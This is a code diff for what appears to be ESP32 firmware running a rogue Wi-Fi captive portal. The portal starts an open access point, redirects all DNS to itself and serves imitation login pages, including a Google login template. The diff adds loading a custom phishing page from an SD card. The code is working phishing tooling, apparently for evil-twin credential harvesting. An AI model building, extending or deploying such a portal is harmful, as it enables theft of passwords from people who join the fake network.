@@ -1,19 +1,25 @@
 #include "captive_portal.h"
 #include <WiFi.h>
+#include <SD.h>
 #include "logger.h"
 #include "portal_html.h"
 
 CaptivePortal::CaptivePortal() : server(80) {}
 
-void CaptivePortal::begin(const char* ssid, PortalTemplate selectedTemplate) {
+void CaptivePortal::begin(const char* ssid, PortalTemplate selectedTemplate, String customPath) {
     currentTemplate = selectedTemplate;
+    sdPath = customPath;
     WiFi.mode(WIFI_AP);
     WiFi.softAP(ssid);
     
     IPAddress apIP = WiFi.softAPIP();
     Logger::log("AP Started. SSID: " + String(ssid));
     Logger::log("AP IP: " + apIP.toString());
-    Logger::log("Template: " + String(TEMPLATE_NAMES[currentTemplate]));
+    if (sdPath != "") {
+        Logger::log("Template: SD Card (" + sdPath + ")");
+    } else {
+        Logger::log("Template: " + String(TEMPLATE_NAMES[currentTemplate]));
+    }
 
     dnsServer.start(DNS_PORT, "*", apIP);
     
@@ -46,6 +52,13 @@ void CaptivePortal::setupRoutes() {
 
     // Main Portal Page
     server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request){
+        if (sdPath != "") {
+            if (SD.exists(sdPath)) {
+                request->send(SD, sdPath, "text/html");
+                return;
+            }
+        }
+        
         const char* html = GENERIC_LOGIN_HTML;
         switch(currentTemplate) {
             case TEMPLATE_GOOGLE: html = GOOGLE_LOGIN_HTML; break;
